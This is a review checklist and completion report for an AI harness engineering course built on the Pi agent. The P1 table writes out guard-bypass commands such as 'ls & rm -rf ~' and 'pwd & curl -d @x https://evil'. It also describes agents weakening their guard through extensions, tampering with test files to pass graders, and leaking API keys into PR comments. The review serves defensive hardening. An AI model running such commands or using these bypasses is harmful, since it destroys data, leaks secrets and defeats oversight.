# Content Review — AI Harness Engineering with Pi

Review date: 2026-11-08. Scope: `AI-HARNESS-ENGINEERING.md` outline vs. `src/data/learning/level-0..7.ts`, `examples/level-0..7/`, `docs/learning-plans/`, `DESIGN.md`.

**Status: approved 2026-11-08; fixes in progress. `[x]` = done.**

How to review: each item has an ID. Tick `[x]` the ones to apply, strike or delete the ones to skip, or add notes inline. Then tell me "approved" (or "approved except …").

## Baseline checks (already run)

- `bunx tsc -p examples/tsconfig.json`: clean.
- Offline tests (`node --test` on Level 3, 5, 6, 7 lib + capstone): 136/136 pass.
- Links: Level 2–3 links all return 200. Spot-checked links in 0–1 and 4–7 resolve. No dead links found.
- Facts were checked against platform.claude.com docs, the Pi repo docs (`earendil-works/pi`), agentskills.io, tbench.ai and arXiv abstracts. **VERIFIED** = confirmed against a source. **SUSPECT** = not confirmed; it will be checked before editing.
- Two high-severity bugs re-confirmed by reading the code myself: P1-01 (`&` separator) and P1-11 (capstone `flag()`).

Severity: **P1** = wrong or unsafe (fix first). **P2** = factual or coverage gap. **P3** = pedagogy, design or consistency.

---

## P1 — Bugs and security holes in examples (lesson teaches something false)

| ID | Where | Problem | Fix |
|---|---|---|---|
| [x] P1-01 | `examples/level-4/01-pi-guard/policy.ts:71`, `level-4.ts:175` | Command split ignores single `&`. `ls & rm -rf ~` and `pwd & curl -d @x https://evil` are **allowed** (verified by run). | Split on `&`, `\|&`. Add tests. Update prose. |
| [x] P1-02 | `01-pi-guard/index.ts:26`, `level-4.ts:166` | Tools other than bash/read/write/edit skip the guard entirely: `grep`/`find`/`ls`, MCP and custom tools. `grep` can read `.env`. The lesson claims "default is ask". | Unknown tool → `ask`. Run `decidePath` on grep/find/ls paths. Add a test. |
| [x] P1-03 | `policy.ts:75`, `level-4.ts:198` | Quote stripping only at token ends. `git show HEAD:".env"`, `git diff -- '*.env'` are allowed (verified by run). The note implies the hole is closed. | Strip all quotes and backslashes. Treat globs near `env`/`ssh` as sensitive. Add tests. Say plainly that regex guards leak. |
| [x] P1-04 | `policy.ts:48-51,88` | Allowing `bun test` plus allowing writes to test files = arbitrary code execution. Writes to `.pi/extensions/`, `.pi/settings.json`, `AGENTS.md`, `.github/workflows/` are allowed, so the agent can install an extension that weakens the guard. | Ask/deny writes to `.pi/**`, `AGENTS.md`/`CLAUDE.md`, `.github/**`. Add a gotcha section: "allow-listing a test runner = allow-listing any code the agent writes". |
| [x] P1-05 | `examples/level-5/04-progress-file.ts:30`, `lib/progress.ts:33,49`, `03-pipeline-gate.ts:24`, `level-5.ts:219` | The prose says the agent "cannot declare victory early". It can: it has write access to `feature_list.json` and `*.test.ts`. | Add an optional `writable` allow-list to `fileTools(root, opts)` (backward-compatible for Level 6/7). Limit writes to `<feature>.ts`. |
| [x] P1-06 | `examples/level-5/lib/patterns.ts:42` | `runGate` passes all of `process.env`, including `ANTHROPIC_API_KEY`, to agent-written code. This contradicts 4.3. | Use a minimal env (`PATH`, `HOME`, `NODE_*`) with an optional `env` param, keeping the signature compatible. |
| [x] P1-07 | `examples/level-5/07-agent-review.yml:40,49` | CI workflow = lethal trifecta. The agent can `read /proc/self/environ` and the key ends up in the PR comment. | Scrub env for the `pi` step. Refuse to post if output matches `sk-ant-`. Add a row to the table and link 4.4. |
| [x] P1-08 | `examples/level-6/lib/golden-tasks.ts:11-21,79,91-96` | Graders never check test-file tampering. Overwriting `X.test.ts` passes. This contradicts the lesson's "graders that are easy to cheat will be cheated". | Restore test files from setup source before grading (or compare a hash). |
| [x] P1-09 | `examples/level-6/06-prompt-caching.ts:16` | Top-level `cache_control` puts the breakpoint after the varying question, so call 2 reads ~0. The script's "Expect: call 2 reads most of prefix" is false. Never run (plan line 105). | Put `cache_control` on a stable `system` text block. Run once and paste the real output. |
| [x] P1-10 | `examples/level-7/04-typed-workflow.ts:18`, `lib/workflow.ts:56` | Cache dir is shared by `--fake` and real runs, and the key lacks the model. A real run after `--fake` returns fake answers. | Include model id (or `fake`) in the cache key. |
| [x] P1-11 | `examples/level-7/capstone/src/cli.ts:8` | `flag()` returns `args[0]` when the flag is missing (`indexOf` = -1, so +1 = 0). The lesson's own command sets `root` to the task text, and every tool fails. (Confirmed.) | `const i = args.indexOf(...); return i >= 0 ? args[i + 1] : undefined`. Add a test. |
| [x] P1-12 | `capstone/src/compaction.ts:48-52` | Client-side compaction edits history but keeps Opus 5.5 thinking blocks in the tail. Edited history can return 400 on newer accounts. Not covered by tests. | Drop thinking blocks from the retained tail (or use server-side compaction). Add a gotcha in 7.5 and 6.4. |
| [x] P1-13 | All Level 0 examples (`02,04,05,06,07,10,11`), `capstone/cli.ts:17`, `bench.ts:109`, `level-5/lib/agent.ts` (4096) | `max_tokens: 1024`/`4096` on `claude-opus-5-5`. Thinking is always on and counts toward `max_tokens`, so runs end `max_tokens` with no text. Examples 05/11 throw, 07 gets `parsed_output: null`. VERIFIED. | Raise to ~16000 (or 4096 + `effort: "low"`). Treat `stop_reason: "max_tokens"` as **not finished** in `lib/agent.ts` and capstone `loop.ts`. Handle `refusal`/`pause_turn` explicitly. |
| [x] P1-14 | `examples/level-0/02-stateless.ts:33` | Rebuilds the assistant turn as text only and drops thinking blocks. This contradicts 05's "append content exactly as returned". | `{ role: "assistant", content: first.content }`. |
| [x] P1-15 | `examples/level-0/06-parallel-tools.ts:33-46` | No-tool answer sends `content: []`, which returns 400. One Zod failure rejects the whole `Promise.all`, against the lesson's `is_error` advice. | Guard on `stop_reason !== "tool_use"`. Map per-call failures to `is_error`. |
| [x] P1-16 | `examples/level-5/04-progress-file.ts:26-33`, `lib/progress.ts:52` | `LoopDetected`/`BudgetExceeded` is uncaught and crashes the process. No `FAILED` is logged, despite the comment "stops itself". | Catch in `implement`, record failure, stop cleanly. |

---

## P2 — Factual errors (verify, then fix)

| ID | Where | Problem | Fix |
|---|---|---|---|
| [x] P2-01 | `level-3.ts:415`, `examples/level-3/05-tool-search.ts:22` | "Only a tool's name is visible up front" for deferred tools. **Wrong** (VERIFIED): deferred tools are not in context at all until a search returns them. | Reword. |
| [x] P2-02 | `level-7.ts:261` | Browser tool called "server-defined". Docs: Anthropic-defined **client** toolset (VERIFIED). | "Anthropic-defined tools your app executes." |
| [x] P2-03 | `level-0.ts:79` | "Opus 4.7+ returns 400 even at default" is imprecise. Sonnet/Haiku 5.5 reject only non-default values. API version `2026-10-21` rejects them on all models (VERIFIED). | Rewrite the sentence. |
| [x] P2-04 | `level-1.ts:213` | Says subdirectory `AGENTS.md` applies below. Pi loads from agent dir + cwd + **parents** only (VERIFIED). | State walk-up behaviour and contrast with the agents.md convention. |
| [x] P2-05 | `level-1.ts:187` | Implies both AGENTS.md and CLAUDE.md load. Pi picks the first match per directory (`AGENTS.override.md` > `AGENTS.md` > `CLAUDE.md`). SUSPECT. | Verify and reword. |
| [x] P2-06 | `level-1.ts:280-284` | "Run `git diff` before you accept". Pi has no accept step; edits land immediately. | Teach: commit/stash checkpoint first, `git diff` after, revert with `git checkout`. |
| [x] P2-07 | `level-1.ts:26` | "Claude Code: doesn't read AGENTS.md (not on agents.md list)". Absence from a list is not evidence. SUSPECT. | Cite Claude Code memory docs (`@AGENTS.md` import) or reword. |
| [x] P2-08 | `level-1.ts:188` | 90.6% / 34.4% / 31.6% figures are not in the arXiv 2602.14690 abstract. SUSPECT. | Verify in the full text, cite section, clarify denominator. |
| [x] P2-09 | `level-3.ts:294-302` | Frontmatter table mixes spec fields with `disable-model-invocation` (Pi/Claude extension, not in spec; VERIFIED). Missing spec rules: hyphen rules, name = dir name, `compatibility` ≤500, `allowed-tools` space-separated. | Split into "spec" and "Pi extension" rows. Add rules. |
| [x] P2-10 | `level-3.ts:184` | Coercions `"true"`→`true` and value→array are not in Pi docs. SUSPECT. | Verify or keep only numeric-string example. |
| [x] P2-11 | `level-2.ts:290` | Says Pi auto-summarizes branches. Pi **asks** first (VERIFIED). | "Pi offers to summarize." |
| [x] P2-12 | `level-2.ts:312` | Caching tip implies forks share cache, but `05-fork-history.ts` has no `cache_control` and the prefix is under the minimum. | "Only with a breakpoint on the shared prefix." |
| [x] P2-13 | `level-2.ts:422` | Project prompt path `.pi/prompts/`. SUSPECT. | Verify in Pi docs. |
| [x] P2-14 | `level-4.ts:427`, `deploy-logic.ts:4` | "Commands the agent can trigger". Pi slash commands are user/RPC-invoked. SUSPECT/misleading. | "A typo or an RPC client". |
| [x] P2-15 | `level-4.ts:204-205`, `level-4.ts:468` | AGENTS.md loads regardless of trust (SUSPECT; verify in `security.md`). `"theme": "light/dark"` pair syntax (SUSPECT; verify in `themes.md`). | Verify. |
| [x] P2-16 | `level-5.ts:332,375` | JSON vs print-mode exit codes, and pi-chat "micro-VM per channel". Both SUSPECT. | Verify in `cli-integration.md` / pi-chat docs. |
| [x] P2-17 | `level-5.ts` task-budgets URL and "beta, advisory" claim | Not verified. | Verify. |
| [x] P2-18 | `level-6.ts:150` | "Passes three in a row 40%" is the C(c,k)/C(n,k) estimate. With p=0.8 it's 51%. | "Estimated ≈40% from these 5 trials." |
| [x] P2-19 | `level-7.ts:430` | "Capstone trace can be summarized by Level 6 tools" is false (different field names, no `turn`, no cache fields). | Match the Level 6 `TraceEvent` shape and test with Level 6 analyzer, or drop the claim. |
| [x] P2-20 | `level-7.ts:338` | "Retries at most twice", but `maxAttempts=2` = one retry. | Fix prose. |
| [x] P2-21 | `level-7.ts:353-362` | `--fake` output shown is the **second** run (2 served from disk). | Show the first run or label it. |
| [x] P2-22 | `AI-HARNESS-ENGINEERING.md:3,42,190`, plan 6.1 | Outline says Terminal-Bench 2.0 is the scoreboard. tbench.ai now headlines 4.0 (VERIFIED). Line 3 "30th → 5th"; source says "Top 30 → Top 5". | Explain that LangChain's result is on 2.0 and current runs are on 4.0. Fix wording. |
| [x] P2-23 | `level-0.ts:208`, `07-structured-output.ts:31` | "Returns a typed validated object", but `parsed_output` can be `null`. | Check `stop_reason`, handle null, adjust prose. |
| [x] P2-24 | `level-6.ts` stats (`lib/eval.ts:61-79`, `01-golden-tasks.ts:50`) | Wilson CI and permutation test treat trials as independent, though they cluster by task, so intervals are too narrow. | Stratified permutation (shuffle within task) / bootstrap over tasks. Say so in prose at `:109`. |
| [x] P2-25 | `lib/eval.ts:33-35` | Infra errors (429, network, no key) count as agent failures. | Record `error` separately. Exclude or retry. |
| [x] P2-26 | `lib/pi-session.ts:28-57` | Ignores Pi `usage` entries (cost), so cost is undercounted. Counts all branches, not the active path. | Add `usage` to totals. Document branch behavior. |

---

## P2 — Coverage gaps (outline bullet missing or thin)

| ID | Lesson | Missing | Proposed addition |
|---|---|---|---|
| [x] C-01 | 0.1 | Thinking (outline: "effort + thinking replace them"). Quadratic attention never named. | Paragraph on adaptive thinking, `medium` default, why examples filter `type === "text"`. One sentence on quadratic cost. |
| [x] C-02 | 0.3 | Malformed call handling. Partial output (abort, `max_tokens` mid-reply, silent thinking pause). | Sentence + code comment in `08`. Short paragraph + gotcha note. |
| [x] C-03 | 0.3 | `10-errors.ts` has no `BadRequestError` branch. Tool error is hard-coded, not thrown. | Add 400 branch ("fix, never retry"). Make `divide` throw. |
| [x] C-04 | 0.4 | OpenAPI, tests, `sed` only as table cells. | Short `node --test` section + `sed`/pipe example, or mark as assumed knowledge. |
| [x] C-05 | 1.1 | Droid dropped. Planned columns (open/closed, extension model, default tools, MCP) replaced. | Restore columns. Add Droid (Factory) row. |
| [x] C-06 | 1.2 | `/tree` via Esc Esc (`doubleEscapeAction`), `/fork`. Install script is now primary. | Add rows. Show `curl …/install.sh` first, npm second. |
| [x] C-07 | 1.3 | Untrusted repo's `AGENTS.md` loads without trust. | Warning note linking 4.4. |
| [x] C-08 | 1.4 | Pi's middle options (`/fork`, `/tree`); `/clear` is Claude Code, Pi uses `/new`. | Name Pi equivalents first. |
| [x] C-09 | 2.1 | Token budgeting per section (only measured). | "Typical size" column + rule of thumb. |
| [x] C-10 | 2.2 | Checkpoints/resumable state: one paragraph. | `PROGRESS.md` template + Anthropic long-running post link. |
| [x] C-11 | 2.4 | Memory "expire". | `updated:` date convention + note on cache invalidation. |
| [x] C-12 | 3.1 | Idempotency / dry-run: prose only. `is_error: true` never mentioned. | 6-line schema snippet (`dry_run`, `confirm`, `idempotency_key`). `is_error` line + comment. |
| [x] C-13 | 3.2 | Model vs TUI formatting: `renderResult` never shown. Abort `signal` not passed to `checkStatus`. | `renderResult` snippet. Pass signal via `AbortSignal.any`. |
| [x] C-14 | 3.3 | Portability list (Pi, Claude Code, Codex, Amp, Droid). Size guidance (~100 tok metadata, <500 lines). | Name them. Add one sentence. |
| [x] C-15 | 3.4 | Resources vs prompts vs tools undefined. "Codemode" undefined. "Tool poisoning" undefined. | 3-row table. One-sentence codemode def. Poisoned-description example. |
| [x] C-16 | 4.1 | Inject-context and audit-log hooks only as table rows. | ~10-line `tool_execution_end` JSONL audit snippet + `before_agent_start` snippet. |
| [x] C-17 | 4.2 | Trust boundaries only as a note (DESIGN §5.1: notes never replace body). | Prose section with an injected-tool-result example. |
| [x] C-18 | 4.4 | Output sanitization: markdown-image exfiltration. | Table row + sentence. |
| [x] C-19 | 5.2 | Planner stage absent (pipeline is implementer → gate → reviewer). Shared state via git not shown. | Add planner stage (or mark as exercise). |
| [x] C-20 | 5.3 | Heartbeats never defined. Wakeups/schedules: no code. Initializer = `seedWorkspace` unstated. | Define heartbeat + watchdog. Cron line with `pi -p`. Name the initializer. |
| [x] C-21 | 5.4 | CI "gated by tests and lint": workflow runs neither. SDK example uses full default tools, no guard. RPC mode: one row. | Add test/lint step before agent. Explicit read-only tools + model in `06-pi-sdk.ts`. |
| [x] C-22 | 6.2 | Token accounting **per tool** (only chars). Session replay: one paragraph. | Estimate tokens per tool result. Small step-through replay. |
| [x] C-23 | 6.3 | "Every fix becomes a test": staged-config task never added to `GOLDEN`. | Export it as a golden task. |
| [x] C-24 | 6.4 | Effort taught as first lever, never shown in code. Cache is model-scoped (routing loses cache). | `output_config: { effort }` snippet. One sentence on cache scope. |
| [x] C-25 | 7.1 | **Comparing harnesses** (Claude Code, Codex CLI, Gemini CLI) missing; outline bullet 1 + plan block 3. Harness-as-platform only a table cell. | Comparison table (loop, permissions, extension model, session storage). Section on packages/plugins/marketplaces. |
| [x] C-26 | 7.2 | Selected and judged on the same tasks; no held-out set (the lesson's own danger note demands one). Harness-R1 detail sits in 6.3 not 7.2. | Held-out seed/task set in accept step (or state limit). Move summary to 7.2. |
| [x] C-27 | 7.3 | Screenshot + action loop: no code. `allowedHosts` option ignored (`void allowed`). | `computer_toolset_20260801` request shape + loop pseudocode. Apply or remove `allowedHosts`. |
| [x] C-28 | 7.5 | Outline "one skill": loader but no skill. Bench: Pi runs default model, tokens=0, no transcripts kept, yet "read the failing transcripts". Write-up template thin. | Add `capstone/skills/<name>/SKILL.md`. Pass `--model`, use `--mode json` for Pi usage, keep traces. Headed write-up template. |

---

## P3 — Pedagogy, design rules, consistency

| ID | Problem | Fix |
|---|---|---|
| [x] D-01 | **No exercises** in any lesson outside Level 3 "Try it" and the capstone. | Add a closing `steps` "Try it" block per lesson (examples: predict token ratio before running 0.1; write AGENTS.md for own repo; bypass the 4.2 guard then fix it; make the 5.3 agent tamper with `feature_list.json` then block it). |
| [x] D-02 | **Missing real-life analogy (`example`) block** in 3.1 (only a case study), 3.2, 2.2, 2.5, 4.1, 4.3, 5.3, 6.2, 6.3, 6.4, 7.1, 7.2, 7.4, 7.5. Misplaced (mid-lesson) in 0.1, 2.1, 5.1. | Add or move to just before Further reading. |
| [x] D-03 | **Dense lessons**: 0.1, 2.2 (3 files + 3 tables), 3.4, 6.1 (~350 lines code, p-value undefined). Level 7 embeds whole lib files (evolution.ts 161 lines, workflow.ts 129, browser-tools.ts 125) without a walkthrough. | Split 2.2 and 6.1 stats. Define p-value. Add a `steps` walkthrough before each long file. |
| [x] D-04 | **>2 notes per section** (DESIGN §5.1): 3.2. Notes over 3 sentences: `level-7.ts:298,475`, `level-6.ts:76`. Note carrying essential config (`level-1.ts:127`). Note duplicating prose (`level-0.ts:193`). | Trim, fold, or move into body. |
| [x] D-05 | 1.2 opens with steps, no concept section. First-task walkthrough has no "what you should see". | Two-line intro. Expected-output steps. |
| [x] D-06 | **Style drift**: Level 1 note titles are custom (DESIGN says category label). Semicolons in L0 vs none in L1. `language: "ts"` (L6) vs `"typescript"` (L7). | Pick one: category labels, semicolons, `"ts"`. |
| [x] D-07 | **Plan drift**: inline code blocks with no `examples/` file (`level-2.ts:222`, `level-3.ts:396,549`, `level-6.ts:277` OTel). Caption `AGENTS.md` vs real path (`level-1.ts:206`). Plan 0.4 says `Bun.spawn`, code uses `execFile`. Setup steps drop `ant auth login` and `.env` note. | Record as "As built" deviations or add files. Fix caption, plan, steps. |
| [x] D-08 | Small code/prose mismatches: `02-truncated-output.ts:28` error string ≠ note text (and starts with "Invalid input:", which the lesson calls useless). `01-tool-schema.ts:27` lacks `format: "date"`. `level-5.ts:145` says `Promise.all` then `allSettled`. `level-6.ts:216` output not labelled shortened. `level-6.ts:552` repeats the effort table. `03-on-demand-compaction.ts:50` silent else. | Fix each inline. |
| [x] D-09 | Minor code hardening: guard `ctx.hasUI` in `05-pi-deploy-command` (lesson says to). Pin `Dockerfile.pi` versions + `--user`. `~` expansion + `/bin/sh` + `-uf` in `policy.ts`. Newline in memory summary (`06-file-memory.ts:41`). Skill fails with no git tags. MCP `pi mcp add` relative path. Loop-guard false positives unmentioned. Trace cache-write priced as 5-min only. | Fix each and add a test where logic changes. |

---

## Proposed order of work (after approval)

1. **P1** bugs, with a failing test first for each logic bug (guard, gate, graders, cache key, CLI flag, stop_reason).
2. **P2** facts: verify each SUSPECT against the source, then edit lesson data + plans.
3. **C** coverage additions, level by level.
4. **D** pedagogy/design passes.
5. After each step: `bun run build`, `bunx tsc -p examples/tsconfig.json`, all offline `node --test` suites. Update `docs/learning-plans/*` "As built" notes and `CLAUDE.md` where facts change (e.g. capstone line/test counts).

Estimated size: P1 ~16 small code changes + tests. P2 ~26 text edits. C ~28 additions (largest: C-25, C-28, D-01).

---

## Completion report (2026-11-08)

All 96 items applied. Verification after the last change:

- `bun run build`: passes.
- `bunx tsc -p examples/tsconfig.json`: clean.
- Pi extensions and the SDK example (`level-3/03`, `level-4/01`, `02`, `05`, `level-5/06`): type-check against `@earendil-works/pi-coding-agent` 1.5.0.
- Offline tests: 180/180 pass (Level 3 extension, Level 4 modules, Level 5/6/7 `lib/`, capstone). New tests were written to fail first for each logic fix (guard bypasses, `writable`, gate env, golden-task tampering, step-cache model key, capstone CLI/stop reasons/thinking blocks/trace shape, stratified test, eval errors, Pi usage entries, per-tool tokens, abort signal, `read_file` offset).
- DESIGN.md "max 2 notes per section": holds in every lesson.

Facts were verified against the Pi 1.5.0 docs shipped in the npm package, the Claude API skill docs (model table cached 2026-10-06), and fetched pages (pi-chat README, Claude Code memory docs, arXiv 2602.14690 full text, task-budgets page, agentskills.io).

### Done differently from the proposal

| Item | What changed |
|---|---|
| P1-04 | Writes to `.pi/**`, `.github/**`, `AGENTS.md`, `CLAUDE.md` now **ask** (not deny), so legitimate edits stay possible with a human in the loop. |
| P1-07 | The agent still needs the API key in its environment, so the fix is a secret scan of `review.md` before posting (literal key + common key patterns), plus a `checks` job. |
| P1-13 | `max_tokens` raised to 16000 across Level 0/2/3 examples, `lib/agent.ts`, the capstone and bench. `RunResult` gained optional `stopReason` (Level 5 and capstone); `pause_turn` continues the capstone loop. |
| P1-14 | Checked against the docs: dropping thinking blocks is allowed, so text-only history was not a 400. Changed anyway to pass `content` unchanged, as the lesson teaches. |
| P2-10, P2-13, P2-15 (theme), P2-16, P2-17 | Verified **correct**; no change needed beyond small wording (pi-chat now names Gondolin). |
| P2-24 | Added `stratifiedPermutationTest` (per-task shuffling) and switched the eval script and the capstone bench to it. `permutationTest` stays for the noise demo. |
| C-23 | Exported the staged failure as golden task 11 (`edit-long-config`), and gave the Level 5 `read_file` an `offset` + pointer (the fix 6.3 teaches). Golden-task count is now 11. |
| C-25 | Comparison table for Pi / Claude Code / Codex CLI / Gemini CLI is written from the projects' docs as of late 2026 and says so; re-check before relying on a row. |
| C-26 | Hold-out uses fresh **seeds** on the same three tasks (the scenario has no spare tasks); the lesson states this limit. |
| D-03 | Lessons were **not split** (that would change slugs and URLs). Instead: p-value defined, reading guides added before the three long Level 7 files. |
| D-06 | Note titles now use category labels; Level 1 got semicolons; Level 7 uses `"ts"`. Level 1's descriptive example titles were kept. |
| D-01/D-02 | "Try it" added to every lesson except 3.4 (already has "Connect it to Pi") and 7.5 (the capstone is the exercise). Real-life examples added where missing. |

### Not verified by running

Examples that call the API were type-checked but **not run** (no `ANTHROPIC_API_KEY` in this environment), including `level-6/06-prompt-caching.ts`: its expected output ("call 2 reads most of the prefix") follows from the docs but has not been observed. The Docker sandbox changes (`--user`, writable `/home/pi`) were not run either.

### Other files touched

`CLAUDE.md` (capstone size/tests; the theme line, which was stale since the dark-mode change), `AI-HARNESS-ENGINEERING.md` (Terminal-Bench wording), `docs/learning-plans/README.md` (snippet exceptions), `level-0`, `level-6`, `level-7` plans.
